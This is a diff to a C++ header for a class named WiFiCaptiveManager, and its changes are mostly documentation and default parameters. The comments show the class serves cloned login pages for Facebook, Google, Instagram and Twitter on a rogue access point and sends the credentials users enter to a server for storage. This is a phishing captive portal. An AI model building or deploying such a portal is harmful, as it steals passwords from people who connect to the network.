@@ -53,7 +53,7 @@ protected:
      * @brief Solicita al servidor la página de inicio de sesión para la plataforma dada
      *        y la almacena en _pageContent.
      * 
-     * @param platform Nombre o identificador de la plataforma para solicitar la página de login.<br>
+     * @param[in] platform Nombre o identificador de la plataforma para solicitar la página de login.<br>
      *        Posibles opciones: {`facebook`, `google`, `instagram`, `twitter`}
      * @return Devuelve true si la conexión y lectura del contenido tuvo éxito, de lo contrario false.
      */
@@ -62,9 +62,9 @@ protected:
     /**
      * @brief Envía las credenciales al servidor para que sean almacenadas
      * 
-     * @param platform Identificador de la plataforma.
-     * @param username Nombre de usuario o identificador.
-     * @param password Contraseña asociada al usuario.
+     * @param[in] platform Identificador de la plataforma.
+     * @param[in] username Nombre de usuario o identificador.
+     * @param[in] password Contraseña asociada al usuario.
      * @return Devuelve true si el envío de credenciales fue exitoso, si no, false.
      */
     bool submitCredentials(const String &platform, const String &username, const String &password);
@@ -80,7 +80,7 @@ public:
     /**
      * @brief Constructor que crea un objeto WiFiClient y asigna un IPAddress al servidor.
      * 
-     * @param ip Dirección IP del servidor para la comunicación en el portal cautivo.
+     * @param[in] ip Dirección IP del servidor para la comunicación en el portal cautivo.
      */
     WiFiCaptiveManager(IPAddress &ip);
 
@@ -90,21 +90,30 @@ public:
      */
     virtual ~WiFiCaptiveManager();
 
+    /**
+     * @brief Borrado para prevenir copias del objeto
+     * 
+     */
     WiFiCaptiveManager(const WiFiCaptiveManager &) = delete;
 
+     /**
+     * @brief Borrado para prevenir copias del objeto
+     * 
+     */
     WiFiCaptiveManager operator=(const WiFiCaptiveManager &) = delete;
 
     /**
      * @brief Actualiza la dirección IP del servidor donde se gestionan las solicitudes del portal cautivo.
      * 
-     * @param IP Objeto IPAddress con la dirección a asignar.
+     * @param[in] IP Objeto IPAddress con la dirección a asignar.
      */
     void setServerIP(const IPAddress &IP);
 
     /**
      * @brief Devuelve el contenido obtenido por getLoginPage.
      * 
-     * @return Referencia a la cadena que contiene el contenido de la página.
+     * @return Referencia a `_pageConetent` que contiene el contenido de la página
+     *         solicita al servidor con `getLoginPage()`
      */
     String &getPageContent();
 
@@ -118,22 +127,20 @@ public:
     /**
      * @brief Configura una conexión WiFi en modo estación.
      * 
-     * @param wifissid Nombre de la red a la que se conectará.
-     * @param wifipsw Contraseña de la red (opcional).
-     * @param apIp Dirección IP opcional para configuración.
+     * @param[in] wifissid Nombre de la red a la que se conectará.
+     * @param[in] wifipsw Contraseña de la red (opcional).
      * @return Devuelve true si la conexión fue exitosa, si no, false.
      */
-    static bool setWifiStation(const String &wifissid, const String &wifipsw = "\0",
-                                    const IPAddress &apIp = IPAddress(192, 168, 1, 3));
+    static bool setWifiStation(const String &wifissid, const String &wifipsw = "\0");
 
     /**
      * @brief Configura el dispositivo en modo punto de acceso.
      * 
-     * @param ssid Nombre del punto de acceso.
-     * @param psw Contraseña del punto de acceso (puede ser nulo).
+     * @param[in] ssid Nombre del punto de acceso.
+     * @param[in] psw Contraseña del punto de acceso (optional).
      * @return Devuelve true si se creó el punto de acceso exitosamente, de lo contrario false.
      */
-    static bool setAccessPoint(const String &ssid, const String &psw);
+    static bool setAccessPoint(const String &ssid, const String &psw = "\0" );
 };
 
 #endif
